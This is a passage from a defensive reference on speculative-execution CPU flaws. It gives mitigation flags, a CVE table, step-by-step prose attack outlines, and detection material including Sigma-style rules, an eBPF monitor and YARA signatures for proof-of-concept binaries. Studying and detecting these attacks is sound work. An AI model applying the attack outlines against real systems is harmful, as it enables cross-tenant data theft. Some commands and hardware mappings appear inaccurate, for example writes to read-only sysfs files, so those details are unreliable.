# GCC — retpoline + indirect branch hardening
CFLAGS="-mindirect-branch=thunk -mindirect-branch-register \
        -mfunction-return=thunk -fcf-protection=full"

# Clang — retpoline + SLH + CFI
CFLAGS="-mretpoline -mspeculative-load-hardening \
        -fcf-protection=full -fsanitize=cfi"

# Kernel build: these are set automatically via CONFIG_RETPOLINE=y
# Verify:
grep CONFIG_RETPOLINE /boot/config-$(uname -r)
grep CONFIG_CFI_CLANG /boot/config-$(uname -r)
```

### 9F.3 Per-process PRCTL mitigations

```c
#include <sys/prctl.h>

/* Disable speculative store bypass for this process */
prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS,
      PR_SPEC_FORCE_DISABLE, 0, 0);

/* Query current SSB status */
int status = prctl(PR_GET_SPECULATION_CTRL, PR_SPEC_STORE_BYPASS, 0, 0, 0);
/* Returns: PR_SPEC_PRCTL | PR_SPEC_FORCE_DISABLE when SSBD is active */

/* Disable indirect branch speculation (IBPB on context switch) */
prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH,
      PR_SPEC_FORCE_DISABLE, 0, 0);

/* Disable rdtsc for sandboxed child process */
prctl(PR_SET_TSC, PR_TSC_SIGSEGV);   /* rdtsc delivers SIGSEGV */
```

### 9F.4 Browser hardening

Required HTTP headers to gate SharedArrayBuffer (prevents §9A.2 timer construction):

```
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

Chrome flags: `--disable-features=SharedArrayBuffer`, `--site-per-process` (default since 67), `--enable-features=StrictOriginIsolation`. Timer degradation (post-Spectre defaults): `performance.now()` = 5 us (Chrome) / 1 ms (Firefox/Safari); `Date.now()` = 1 ms + jitter.

### 9F.5 Virtualization hardening

```bash
echo 1 > /sys/kernel/debug/x86/l1d_flush          # L1D flush on VM entry (L1TF)
echo 1 > /proc/sys/kernel/sched_core_enabled       # core scheduling (SMT isolation)
echo off > /sys/devices/system/cpu/smt/control      # disable SMT (nuclear option)
echo 1 > /sys/module/kvm/parameters/nx_huge_pages   # iTLB-multihit mitigation
# Verify: cat /sys/devices/system/cpu/vulnerabilities/spectre_v2
# Should show "Enhanced IBRS" or "IBRS; IBPB: conditional; RSB filling"
```

---

## 9G. CVE reference table

| CVE | Name | Variant | Disclosure | Affected | CVSS 3.1 | Mitigation |
|---|---|---|---|---|---|---|
| CVE-2017-5753 | Spectre v1 | Bounds Check Bypass (PHT) | 2018-01-03 | Intel, AMD, ARM | 5.6 | `array_index_nospec`, `lfence`, SLH |
| CVE-2017-5715 | Spectre v2 | Branch Target Injection (BTB) | 2018-01-03 | Intel, AMD, ARM | 5.6 | Retpoline, IBRS, IBPB, eIBRS |
| CVE-2017-5754 | Meltdown | Rogue Data Cache Load | 2018-01-03 | Intel (pre-Ice Lake), ARM A75 | 5.6 | KPTI, in-silicon fix (Ice Lake+) |
| CVE-2018-3639 | Spectre v4 | Speculative Store Bypass | 2018-05-21 | Intel, AMD, ARM | 5.5 | SSBD, `prctl PR_SPEC_STORE_BYPASS` |
| CVE-2018-3640 | Spectre v3a | Rogue System Register Read | 2018-05-21 | Intel, ARM | 5.6 | Microcode update |
| CVE-2018-3615 | Foreshadow (L1TF-SGX) | L1 Terminal Fault — SGX | 2018-08-14 | Intel | 6.4 | SGX microcode, attestation update |
| CVE-2018-3620 | Foreshadow-OS (L1TF) | L1 Terminal Fault — OS/kernel | 2018-08-14 | Intel | 5.6 | PTE inversion, L1D flush |
| CVE-2018-3646 | Foreshadow-VMM (L1TF) | L1 Terminal Fault — VMM | 2018-08-14 | Intel | 5.6 | L1D flush on VM entry, EPT hardening |
| CVE-2018-12130 | ZombieLoad (MFBDS) | Microarchitectural Fill Buffer Data Sampling | 2019-05-14 | Intel | 6.5 | MD_CLEAR, `mds=full`, microcode |
| CVE-2019-11091 | RIDL (MDSUM) | Microarchitectural Data Sampling Uncacheable Memory | 2019-05-14 | Intel | 3.8 | MD_CLEAR, microcode |
| CVE-2019-11135 | TAA | TSX Asynchronous Abort | 2019-11-12 | Intel (with TSX) | 6.5 | `tsx=off`, microcode, MD_CLEAR |
| CVE-2020-0549 | CacheOut (L1DES) | L1D Eviction Sampling | 2020-01-27 | Intel | 6.5 | Microcode, L1D flush |
| CVE-2020-0551 | LVI | Load Value Injection | 2020-03-10 | Intel (SGX) | 5.6 | `lfence` after loads in SGX, compiler |
| CVE-2022-23960 | Spectre-BHB | Branch History Injection | 2022-03-08 | Intel, ARM | 5.6 | BHI_DIS_S, BHB clear sequence, `CLEARBHB` |
| CVE-2022-29900 | Retbleed (AMD) | Return Address Prediction | 2022-07-12 | AMD Zen 1/1+/2 | 5.6 | Untrain-return, IBPB |
| CVE-2022-29901 | Retbleed (Intel) | Return Address Prediction | 2022-07-12 | Intel 6th-8th gen | 5.6 | eIBRS, IBRS |
| CVE-2022-40982 | GDS / Downfall | Gather Data Sampling | 2023-08-08 | Intel 6th-11th gen | 6.5 | Microcode (AVX gather mitigation) |
| CVE-2023-20569 | Inception | Return Address Prediction (AMD) | 2023-08-08 | AMD Zen 3/4 | 5.6 | IBPB, microcode, kernel patch |
| CVE-2023-20593 | Zenbleed | AMD Zen2 Register File Leak | 2023-07-24 | AMD Zen 2 | 6.5 | Microcode, `chicken bit` DE_CFG[9] |
| CVE-2024-2201 | Native BHI | Branch History Injection (native) | 2024-04-09 | Intel Alder Lake+ | 5.6 | BHI_DIS_S, microcode, BHB clearing |

---

## 10. Post-2020 speculative execution attacks

The original Spectre and Meltdown disclosures (January 2018) revealed the fundamental vulnerability class. Subsequent years demonstrated that hardware mitigations (eIBRS, retpoline, KPTI) were necessary but insufficient — researchers repeatedly found new speculation primitives that bypassed deployed defenses. This section covers the major post-2020 attacks that extend the speculative execution model described in §1, focusing on which predictor structures are exploited, the precise microarchitectural mechanism, and the covert channel used for data exfiltration. For the hardware vulnerability response and disclosure timeline perspective, see Chapter 7B.

### 10.1 Branch History Injection (BHI / Spectre-BHB)

**CVE:** CVE-2022-0001 (intra-mode BHI), CVE-2022-0002 (intra-mode BTI), CVE-2022-23960 (ARM).

**Mechanism.** eIBRS (Enhanced Indirect Branch Restricted Speculation), deployed as the primary Spectre v2 mitigation on Intel since 2019, prevents the *unprivileged* BTB from directing *privileged* indirect branch predictions. However, eIBRS does not isolate the Branch History Buffer (BHB) across privilege levels. The BHB — a shift register recording the outcomes and target addresses of the last ~29 branches (Intel) — feeds into the BTB lookup hash function. An attacker who executes a carefully crafted sequence of branches in user space can inject a specific BHB state that, when the CPU transitions to kernel mode, collides with the BHB state associated with a kernel indirect branch target. The attacker does not inject the target address directly into the BTB (eIBRS prevents that); instead, the attacker controls the *history context* under which the BTB is queried, steering the prediction to a kernel gadget address that was legitimately trained during prior kernel execution.

**Cross-privilege exploitation path:**

1. Attacker identifies an indirect branch in kernel code (e.g., `call [rax]` in a syscall handler) and a useful gadget at a known kernel address.
2. Attacker constructs a user-space branch sequence whose BHB fingerprint matches the BHB state the kernel's BTB entry was trained under.
3. Attacker executes this branch sequence, writing the crafted state into the BHB.
4. Attacker triggers a syscall. The kernel indirect branch is queried with the attacker-controlled BHB state, producing a speculative jump to the attacker-chosen gadget.
5. The gadget speculatively accesses kernel memory and encodes it via a cache side channel (Flush+Reload or similar).

**Impact:** Intel (all eIBRS-capable processors), ARM (Cortex-A73 through Cortex-X2, Neoverse N1/N2/V1). AMD processors use a longer BHB (194+ entries on Zen 3), making the collision attack significantly harder but not impossible.

**Mitigations:**

- **BHI_DIS_S** (Intel microcode): A new MSR bit that disables supervisor indirect branch predictions when the BHB contains user-mode entries. Available on Alder Lake and later via microcode update.
- **BHB clear sequence**: The kernel inserts a long branch sequence (typically 194 branches on some ARM platforms) at kernel entry to overwrite the user-mode BHB state. This is the `CLEARBHB` instruction on ARMv8.9+.
- **Software BHB clearing on Intel pre-Alder Lake**: A loop of 29+ unconditional branches at syscall entry, flushing user BHB state. Performance cost: 1-5% on syscall-heavy workloads.

```bash
# Verify BHI mitigation status
cat /sys/devices/system/cpu/vulnerabilities/spec_rstack_overflow
cat /sys/devices/system/cpu/vulnerabilities/spectre_v2
# Expected: "Mitigation: eIBRS + BHI_DIS_S" or "Mitigation: eIBRS, BHI: SW loop"

# Kernel boot parameter
spectre_bhi=on   # Enable BHB clearing sequence at kernel entry
```

### 10.2 Retbleed — return instruction speculation

**CVE:** CVE-2022-29900 (AMD), CVE-2022-29901 (Intel).

**Mechanism.** Retpoline, deployed since 2018 as the primary Spectre v2 software mitigation, replaces indirect branches with a `ret` instruction sequence under the assumption that `ret` predictions come exclusively from the Return Stack Buffer (RSB) and are thus safe from cross-process training. Retbleed demonstrated that this assumption is false on specific microarchitectures.

**AMD Zen 1/1+/2 behavior.** When the RSB underflows (more `ret`s than `call`s in the prediction window, or the RSB is exhausted), AMD Zen 1/1+/2 processors fall back to the BTB for `ret` target prediction. This means `ret` instructions on these microarchitectures are susceptible to the same BTB poisoning as indirect `jmp`/`call` — an attacker who trains the BTB with a target address for a kernel `ret` instruction can redirect speculative execution to an arbitrary gadget. The retpoline defense is completely bypassed because retpoline *relies* on `ret` being BTB-immune.

**Intel 6th-8th generation behavior.** On Skylake through Coffee Lake, the RSB can be influenced by deep speculation across context switches. When a task switch occurs during deep speculation, the RSB may contain stale entries from a different context. The speculated `ret` follows these stale RSB entries, potentially landing on attacker-controlled addresses if the attacker previously executed a matching `call` pattern.

**Attack primitive:**

1. Attacker triggers RSB underflow (deep call chain then rapid returns) or RSB pollution (cross-context RSB entries).
2. Kernel `ret` instruction falls back to BTB (AMD) or consumes stale RSB entry (Intel).
3. Speculative execution lands at attacker-chosen gadget; secret data is exfiltrated via cache covert channel.

**Affected CPUs:**
- AMD: Zen 1 (Ryzen 1000/EPYC 7001), Zen 1+ (Ryzen 2000/EPYC 7002), Zen 2 (Ryzen 3000/EPYC 7002). Zen 3+ uses a different RSB underflow policy and is not affected.
- Intel: Skylake (6th gen), Kaby Lake (7th gen), Coffee Lake (8th gen). eIBRS on 10th gen+ mitigates.

**Mitigations:**

- **AMD untrain-return (`retbleed=unret`):** Inserts a sequence that "untrains" the BTB entry for the return address, ensuring the BTB does not predict `ret` targets. Implemented as `SRSO_SAFE_RET` in the Linux kernel.
- **AMD IBPB (`retbleed=ibpb`):** Flushes the entire branch predictor state on context switch. Higher performance cost (~10-15% on syscall-heavy workloads) but guaranteed safe.
- **Intel IBRS/eIBRS:** eIBRS prevents cross-privilege BTB training, mitigating Retbleed for 10th gen+. For 6th-8th gen, full IBRS (on every kernel entry) is required.

```bash
# Check Retbleed status
cat /sys/devices/system/cpu/vulnerabilities/retbleed
# AMD expected: "Mitigation: untrained return thunk" or "Mitigation: IBPB"
# Intel expected: "Mitigation: Enhanced IBRS" or "Mitigation: IBRS"

# Force specific mitigation
# /etc/default/grub → GRUB_CMDLINE_LINUX:
retbleed=unret      # AMD: untrain-return (lower overhead)
retbleed=ibpb       # AMD: full predictor flush (higher security)
```

### 10.3 Gather Data Sampling / Downfall (GDS)

**CVE:** CVE-2022-40982. Disclosed August 2023 by Daniel Moghimi (Google).

**Mechanism.** AVX2 and AVX-512 gather instructions (`VPGATHERDD`, `VPGATHERQQ`, etc.) load data from non-contiguous memory locations into a single SIMD register. Internally, the CPU decomposes a gather into multiple micro-ops, each performing a separate load. On affected Intel microarchitectures (6th through 11th generation), the gather micro-ops share an internal staging buffer (the "gather buffer") that transiently forwards data from prior gather operations — including gathers executed by different security domains (other processes, other privilege levels, or other virtual machines sharing the same physical core).

**Data forwarding path:** When a gather micro-op encounters a cache miss, it may transiently receive stale data from the gather buffer that was populated by a *different* context's prior gather instruction. This stale data is architecturally discarded when the correct data arrives from cache/DRAM, but during the transient window, the attacker can encode the leaked data via a cache side channel.

**Exploitation:**

1. Victim executes AVX gather instructions (common in cryptographic libraries, ML frameworks, database engines).
2. Attacker, co-resident on the same physical core, executes a gather instruction that triggers a cache miss.
3. The gather buffer forwards the victim's data to the attacker's transient execution.
4. Attacker encodes leaked bytes via Flush+Reload on a probe array.

**Key implications:** GDS is particularly dangerous because it leaks data from *different security domains sharing a physical core* — this includes cross-VM leakage on shared hosting, making it a direct threat to cloud multi-tenancy. The attack leaks data at approximately 8 bytes per gather operation, with demonstrated extraction rates of several hundred bytes per second.

**Affected CPUs:** Intel 6th generation (Skylake) through 11th generation (Rocket Lake / Tiger Lake). 12th generation (Alder Lake) and later are not affected — the gather buffer forwarding behavior was fixed in silicon.

**Mitigations:**

- **Microcode update:** Intel released microcode that serializes gather operations, preventing cross-domain data forwarding. Performance impact: 0-50% for AVX-heavy workloads (cryptography, scientific computing, ML inference), negligible for non-AVX workloads.
- **Kernel parameter:** `gather_data_sampling=force` (enables mitigation even if microcode default is off).
- **Opt-out:** `gather_data_sampling=off` — only for dedicated single-tenant systems where no cross-domain leakage risk exists.

```bash
# Check GDS vulnerability status
cat /sys/devices/system/cpu/vulnerabilities/gather_data_sampling
# Expected: "Mitigation: Microcode" or "Not affected"

# Verify microcode version (Intel)
dmesg | grep microcode
# Compare against Intel's published microcode guidance:
# Skylake: >= 0xf4, Kaby Lake: >= 0xf4, Coffee Lake: >= 0xf4, etc.

# Performance impact measurement for AVX workloads
# Before mitigation:
echo off > /sys/devices/system/cpu/vulnerabilities/gather_data_sampling 2>/dev/null
perf stat -e instructions,cycles,cpu-clock -r 5 -- ./avx_benchmark
# After mitigation:
echo force > /sys/devices/system/cpu/vulnerabilities/gather_data_sampling 2>/dev/null
perf stat -e instructions,cycles,cpu-clock -r 5 -- ./avx_benchmark
```

### 10.4 Inception / SRSO (Speculative Return Stack Overflow)

**CVE:** CVE-2023-20569 (Inception/SRSO). Disclosed August 2023.

**Mechanism.** Inception (also called Phantom or SRSO — Speculative Return Stack Overflow) targets AMD Zen 3 and Zen 4 processors. The attack exploits a transient execution window during which the CPU mispredicts `ret` targets by manipulating the RSB through a technique called "phantom speculation."

On AMD Zen 3/4, when the CPU encounters a `ret` instruction and the RSB is in a specific state (not strictly underflowed, but in a state where the top RSB entry can be influenced), the processor may speculatively execute from an address that the attacker has trained into the BTB via a carefully crafted call/return sequence. Unlike Retbleed (which requires RSB underflow on Zen 1/2), Inception works on Zen 3/4 by exploiting the *interaction* between the RSB and the BTB: the attacker constructs a "phantom" call that inserts a controlled entry into the RSB without architecturally executing a corresponding `call`, then triggers the victim's `ret` to consume that phantom entry.

**Phantom call mechanism:** The attacker executes a branch sequence that creates a transient micro-op that resembles a `call` instruction to the prediction hardware. This phantom call pushes an attacker-controlled address onto the RSB. When the victim (kernel or hypervisor) subsequently executes a `ret`, the RSB predicts the phantom address, and the CPU speculatively executes at the attacker's chosen gadget.

**Affected CPUs:** AMD Zen 3 (Ryzen 5000/EPYC 7003) and Zen 4 (Ryzen 7000/EPYC 9004). Zen 1/2 use a different RSB mechanism and are affected by Retbleed instead. Zen 5 includes in-silicon mitigations.

**Mitigations:**

- **IBPB on kernel entry:** Flush all branch predictor state when transitioning from user to kernel. High overhead (~15-30% on syscall-intensive workloads).
- **Microcode safe-RET:** AMD microcode update that ensures `ret` predictions are sourced exclusively from a validated RSB, ignoring BTB fallback and phantom entries.
- **Kernel SRSO mitigation (`spec_rstack_overflow=safe-ret`):** Uses the `SRSO_SAFE_RET` sequence — a kernel return thunk that resets the RSB prediction state before the actual return.

```bash
# Check SRSO/Inception status
cat /sys/devices/system/cpu/vulnerabilities/spec_rstack_overflow
# Expected: "Mitigation: Safe RET" or "Mitigation: IBPB"

# Kernel parameter options
spec_rstack_overflow=safe-ret     # Lower overhead, microcode-dependent
spec_rstack_overflow=ibpb         # Full predictor flush
spec_rstack_overflow=off          # Disable (single-tenant only)
```

### 10.5 Zenbleed — AMD Zen 2 register file leak

**CVE:** CVE-2023-20593. Disclosed July 2023 by Tavis Ormandy (Google Project Zero).

**Mechanism.** Zenbleed is a register-file data leak in AMD Zen 2 processors caused by a bug in the speculative handling of the `VZEROUPPER` instruction. `VZEROUPPER` clears the upper 128 bits of all YMM registers (the AVX portion) and is commonly emitted by compilers at function boundaries when transitioning between AVX and SSE code.

The vulnerability arises from a race condition in the rename/retirement pipeline. When `VZEROUPPER` is speculatively executed and then rolled back (due to a misprediction or another transient event), the register file's rename table can enter an inconsistent state where a physical register that was *freed* by the speculative `VZEROUPPER` is *reallocated* to a different logical register before the rollback completes. The result: the attacker's register read returns the *stale contents* of the physical register, which may contain data from any prior execution context — including a different process, a different VM, or the kernel.

**Key properties:**

- **Cross-context leakage:** The leaked register contents come from whatever context last used that physical register. On a shared core, this means data from co-tenant VMs, other user processes, or the kernel.
- **No special instructions required:** The attacker needs only standard AVX instructions and the ability to trigger misprediction around `VZEROUPPER`. A simple PoC runs in user space without elevated privileges.
- **High bandwidth:** The leak can extract data at approximately 30 KB/s per core, fast enough to capture cryptographic keys, authentication tokens, and other transient secrets.
- **No cache side channel needed:** Unlike Spectre variants, Zenbleed leaks data directly into architectural registers — no covert channel encoding/decoding step is required.

**Affected CPUs:** AMD Zen 2 only — Ryzen 3000 series, Ryzen 4000 (APU), EPYC 7002 (Rome), Threadripper 3000. Not affected: Zen 1, Zen 3, Zen 4.

**Mitigations:**

- **Microcode update:** AMD released corrected microcode that fixes the rename-table rollback logic. This is the definitive fix.
- **Chicken bit workaround (`DE_CFG[9]`):** Setting bit 9 of the DE_CFG MSR (MSR 0xC0011029) disables the optimization that triggers the bug. This can be applied without a microcode update but incurs a minor performance penalty on AVX-heavy workloads.

```bash
# Check if Zenbleed microcode is applied
dmesg | grep -i "microcode\|zenbleed"

# Verify DE_CFG chicken bit (requires root + msr-tools)
rdmsr 0xC0011029
# Bit 9 set = workaround active. Example: if value is 0x0200, bit 9 is set.

# Apply chicken bit manually (emergency, before microcode is available)
wrmsr -a 0xC0011029 $(printf '0x%x' $(($(rdmsr -c 0xC0011029) | (1 << 9))))

# Persistent via systemd unit
cat > /etc/systemd/system/zenbleed-workaround.service << 'UNIT'
[Unit]
Description=Zenbleed DE_CFG chicken bit workaround
After=multi-user.target
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'modprobe msr; for cpu in /dev/cpu/*/msr; do n=${cpu#/dev/cpu/}; n=${n%%/*}; wrmsr -p $n 0xC0011029 $(printf "0x%%x" $(($(rdmsr -c -p $n 0xC0011029) | (1 << 9)))); done'
[Install]
WantedBy=multi-user.target
UNIT
systemctl enable zenbleed-workaround.service
```

### 10.6 Native BHI

**CVE:** CVE-2024-2201. Disclosed April 2024.

**Mechanism.** Native BHI extends the original BHI attack (§10.1) by demonstrating that Branch History Injection can be performed without unprivileged eBPF — contradicting the initial assumption that BHI was primarily exploitable via eBPF JIT gadgets. The researchers showed that sufficient "native" gadgets (existing code sequences in the kernel text) can be chained to construct a disclosure primitive using only the BHB manipulation technique.

**Difference from BHI (CVE-2022-23960):** The original BHI disclosure relied on eBPF to construct the speculative gadget within the kernel. Many distributions responded by disabling unprivileged eBPF (`kernel.unprivileged_bpf_disabled=1`). Native BHI demonstrates that this countermeasure is insufficient — the kernel's own code contains enough indirect-branch gadgets to mount the attack without any eBPF involvement.

**Affected CPUs:** Intel Alder Lake (12th gen) and later, including Raptor Lake (13th gen) and Meteor Lake. These processors have eIBRS but lack BHI_DIS_S in their initial microcode. ARM processors with BHB-dependent prediction (Cortex-A77 and later) may also be affected.

**Mitigations:**

- **BHI_DIS_S microcode:** The definitive hardware mitigation — disables supervisor predictions from user-polluted BHB.
- **BHB clearing loop at kernel entry:** Software mitigation for CPUs without BHI_DIS_S support.
- **FineIBT + BHB clearing:** Combination of Control-Flow Integrity (kernel CFI via FineIBT) with BHB state clearing reduces the available gadget surface.

```bash
# Check Native BHI mitigation
cat /sys/devices/system/cpu/vulnerabilities/spectre_v2
# Look for "BHI: BHI_DIS_S" or "BHI: SW loop, KP"

# Verify unprivileged eBPF is disabled (defense-in-depth, not sufficient alone)
sysctl kernel.unprivileged_bpf_disabled
# Expected: 1 or 2

# Verify FineIBT (kernel CFI)
dmesg | grep -i "fine.*ibt\|cfi"
grep CONFIG_CFI_CLANG /boot/config-$(uname -r)
```

### 10.7 Comparative attack taxonomy

| Attack | CVE | Predictor | Mechanism | Covert Channel | Affected | Kernel param |
|---|---|---|---|---|---|---|
| BHI | CVE-2022-23960 | BHB→BTB | History injection bypasses eIBRS | Cache (F+R) | Intel, ARM | `spectre_bhi=on` |
| Retbleed | CVE-2022-29900/01 | RSB→BTB | RSB underflow falls back to BTB | Cache (F+R) | AMD Zen1/2, Intel 6-8th | `retbleed=auto` |
| GDS/Downfall | CVE-2022-40982 | N/A (buffer) | Gather buffer forwards stale data | Cache (F+R) | Intel 6-11th gen | `gather_data_sampling=force` |
| Inception/SRSO | CVE-2023-20569 | RSB | Phantom call injects RSB entry | Cache (F+R) | AMD Zen 3/4 | `spec_rstack_overflow=safe-ret` |
| Zenbleed | CVE-2023-20593 | N/A (regfile) | VZEROUPPER rollback race | Direct register | AMD Zen 2 | Microcode / DE_CFG[9] |
| Native BHI | CVE-2024-2201 | BHB→BTB | Native gadget BHI without eBPF | Cache (F+R) | Intel 12th gen+ | `spectre_bhi=on` |

---

## 11. Side-channel detection engineering enhancement

This section extends the detection rules in §9E with additional coverage for post-2020 attack indicators, cloud-specific monitoring, and eBPF-based real-time detection. The rules below target observable behaviors that distinguish active microarchitectural attacks from normal system operation.

### 11.1 Performance counter anomaly detection rules

```yaml
title: Speculative Execution Timing Anomaly — BACLEARS Spike
id: d6a0e5f4-c071-7b1d-e9f8-4b5a6c7d8e9f
status: experimental
description: >
  Elevated BACLEARS.ANY count indicates front-end resteer events from
  branch misprediction. Sustained high rate correlates with active
  BTB/BHB training for Spectre v2, BHI, or Retbleed exploitation.
logsource:
    category: performance_counter
    product: linux
detection:
    selection:
        CounterName: 'cpu/event=0xe6,umask=0x01/'
    filter_spike:
        CounterRate|gte: 50000
        Duration|lte: 5000
    condition: selection and filter_spike
level: high
tags: [attack.execution, attack.t1106, cve.2022.23960, cve.2022.29900]
```

```yaml
title: Sustained Branch Misprediction Rate Anomaly
id: e7b1f6a5-d182-8c2e-fa09-5c6b7d8e9f0a
status: experimental
description: >
  Branch misprediction rate exceeding 10% sustained over 5+ seconds
  indicates possible BTB/BHB training activity. Normal workloads
  maintain <2% misprediction rate.
logsource:
    category: performance_counter
    product: linux
detection:
    selection:
        EventType: 'perf_ratio'
        Numerator: 'branch-misses'
        Denominator: 'branches'
    filter_anomaly:
        Ratio|gte: 0.10
        SustainedSeconds|gte: 5
    condition: selection and filter_anomaly
level: high
tags: [attack.credential_access, attack.t1003, cve.2017.5715]
```

```yaml
title: clflush/clflushopt Burst Frequency Anomaly
id: f8c2a7b6-e293-9d3f-ab1a-6d7c8e9f0b1c
status: experimental
description: >
  High-frequency clflush or clflushopt execution indicates active
  cache eviction for Flush+Reload or Flush+Flush side channel.
  Normal workloads rarely issue >100 clflush/s per process.
logsource:
    category: performance_counter
    product: linux
detection:
    selection:
        CounterName|contains:
            - 'clflush'
            - 'L2_TRANS.ALL_REQUESTS'
    filter_burst:
        CounterRate|gte: 10000
        ProcessIsUnprivileged: true
    condition: selection and filter_burst
level: high
tags: [attack.collection, attack.t1005]
```

```yaml
title: Shared Memory Timing Measurement Pattern
id: a9d3b8c7-f3a4-ae40-bc2b-7e8d9f0a1c2d
status: experimental
description: >
  Process maps shared library or shared memory segment and immediately
  performs high-frequency timed access — Flush+Reload setup indicator.
logsource:
    category: syscall
    product: linux
detection:
    selection_mmap:
        Syscall: 'mmap'
        Flags|contains: 'MAP_SHARED'
    selection_timing:
        Syscall|contains:
            - 'perf_event_open'
            - 'clock_gettime'
        ProcessId: '$selection_mmap.ProcessId'
    timeframe: 1s
    condition: selection_mmap and selection_timing
level: medium
tags: [attack.collection, attack.t1005]
```

```yaml
title: rdtsc/rdtscp High-Frequency Execution with AVX Context
id: b0e4c9d8-a4b5-bf51-cd3c-8f9e0a1b2d3e
status: experimental
description: >
  Combines rdtsc frequency anomaly with AVX instruction usage —
  potential GDS/Downfall exploitation indicator (gather + timing).
logsource:
    category: performance_counter
    product: linux
detection:
    selection_rdtsc:
        CounterName: 'instructions:u'
        CommandLine|contains:
            - 'rdtsc'
            - 'rdtscp'
    selection_avx:
        CounterName|contains:
            - 'FP_ARITH_INST_RETIRED'
            - 'AVX'
    filter_combined:
        CounterRate|gte: 5000
    condition: (selection_rdtsc or selection_avx) and filter_combined
level: high
tags: [attack.collection, cve.2022.40982]
```

### 11.2 eBPF-based cache monitoring

eBPF programs attached to perf events can provide real-time, low-overhead cache anomaly detection directly in the kernel.

```c
/* ebpf_cache_monitor.c — LLC miss rate monitor via BPF perf event
 * Compile: clang -O2 -target bpf -c ebpf_cache_monitor.c -o ebpf_cache_monitor.o
 * Attach via bpftool or libbpf userspace loader.
 */

#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u32);     /* pid */
    __type(value, __u64);   /* miss count in window */
} cache_miss_count SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u32);
    __type(value, __u64);   /* reference count in window */
} cache_ref_count SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} alerts SEC(".maps");

struct alert_event {
    __u32 pid;
    __u32 cpu;
    __u64 miss_count;
    __u64 ref_count;
    __u64 timestamp_ns;
};

#define MISS_RATIO_THRESHOLD_PCT 80
#define MIN_REFERENCES           1000

SEC("perf_event")
int on_cache_miss(struct bpf_perf_event_data *ctx)
{
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __u64 *count = bpf_map_lookup_elem(&cache_miss_count, &pid);
    if (count) {
        __sync_fetch_and_add(count, 1);
    } else {
        __u64 init = 1;
        bpf_map_update_elem(&cache_miss_count, &pid, &init, BPF_ANY);
    }

    __u64 *refs = bpf_map_lookup_elem(&cache_ref_count, &pid);
    if (refs && *refs >= MIN_REFERENCES) {
        __u64 misses = count ? *count : 1;
        if ((misses * 100) / *refs > MISS_RATIO_THRESHOLD_PCT) {
            struct alert_event *evt;
            evt = bpf_ringbuf_reserve(&alerts, sizeof(*evt), 0);
            if (evt) {
                evt->pid = pid;
                evt->cpu = bpf_get_smp_processor_id();
                evt->miss_count = misses;
                evt->ref_count = *refs;
                evt->timestamp_ns = bpf_ktime_get_ns();
                bpf_ringbuf_submit(evt, 0);
            }
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

```bash
# Deploy the eBPF cache monitor
# Attach to LLC-load-misses perf event for all CPUs
bpftool prog load ebpf_cache_monitor.o /sys/fs/bpf/cache_monitor
bpftool perf attach /sys/fs/bpf/cache_monitor event=cache-misses

# Read alerts from ringbuf
bpftool map dump name alerts

# Alternative: use bpftrace one-liner for quick anomaly check
bpftrace -e '
hardware:cache-misses:1000 {
    @miss[pid, comm] = count();
}
hardware:cache-references:1000 {
    @ref[pid, comm] = count();
}
interval:s:5 {
    print(@miss); print(@ref);
    clear(@miss); clear(@ref);
}'
```

### 11.3 YARA rules for post-2020 PoC artifacts

```yara
rule Retbleed_PoC_Binary {
    meta:
        description = "Compiled Retbleed PoC — RSB underflow + BTB training pattern"
        cve = "CVE-2022-29900"
    strings:
        $rdtscp   = { 0F 01 F9 }
        $clflush  = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $retslide = { C3 C3 C3 C3 C3 C3 C3 C3 }
        $s1 = "retbleed" ascii nocase
        $s2 = "rsb" ascii nocase
        $s3 = "underflow" ascii nocase
        $s4 = "untraining" ascii nocase
    condition:
        uint32(0) == 0x464C457F and $rdtscp and $retslide and 1 of ($s*)
}

rule GDS_Downfall_PoC {
    meta:
        description = "GDS/Downfall PoC — AVX gather + cache timing extraction"
        cve = "CVE-2022-40982"
    strings:
        $vpgather1 = { C4 (E2|62) .. (90|91|92|93) }
        $vpgather2 = "vpgatherd" ascii nocase
        $rdtscp    = { 0F 01 F9 }
        $s1 = "gather" ascii nocase
        $s2 = "downfall" ascii nocase
        $s3 = "GDS" ascii
        $s4 = "sampling" ascii nocase
    condition:
        uint32(0) == 0x464C457F and ($vpgather1 or $vpgather2) and
        $rdtscp and 1 of ($s*)
}

rule Zenbleed_PoC {
    meta:
        description = "Zenbleed PoC — VZEROUPPER + XMM/YMM register leak"
        cve = "CVE-2023-20593"
    strings:
        $vzeroupper = { C5 F8 77 }
        $rdmsr      = { 0F 32 }
        $s1 = "zenbleed" ascii nocase
        $s2 = "vzeroupper" ascii nocase
        $s3 = "DE_CFG" ascii
        $s4 = "0xC0011029" ascii
    condition:
        uint32(0) == 0x464C457F and $vzeroupper and 1 of ($s*)
}

rule Inception_SRSO_PoC {
    meta:
        description = "Inception/SRSO PoC — phantom call + RSB manipulation"
        cve = "CVE-2023-20569"
    strings:
        $rdtscp  = { 0F 01 F9 }
        $clflush = { 0F AE (38|39|3A|3B|3C|3D|3E|3F) }
        $s1 = "inception" ascii nocase
        $s2 = "srso" ascii nocase
        $s3 = "phantom" ascii nocase
        $s4 = "spec_rstack" ascii nocase
    condition:
        uint32(0) == 0x464C457F and $rdtscp and 1 of ($s*)
}
```

### 11.4 Cloud provider detection and mitigations

**Core scheduling verification.** Cloud providers (AWS, GCP, Azure) deploy core scheduling to prevent cross-tenant SMT side channels. Verify that core scheduling is active:

```bash
# Linux 5.14+ core scheduling status
cat /proc/sys/kernel/sched_core_enabled
# 1 = enabled

# Verify per-cgroup core scheduling (Kubernetes pod isolation)
cat /sys/fs/cgroup/cpu/kubepods/pod-*/cpu.core_tag
# Non-empty = core tag assigned, SMT siblings share tag

# Check if hypervisor enforces SMT isolation
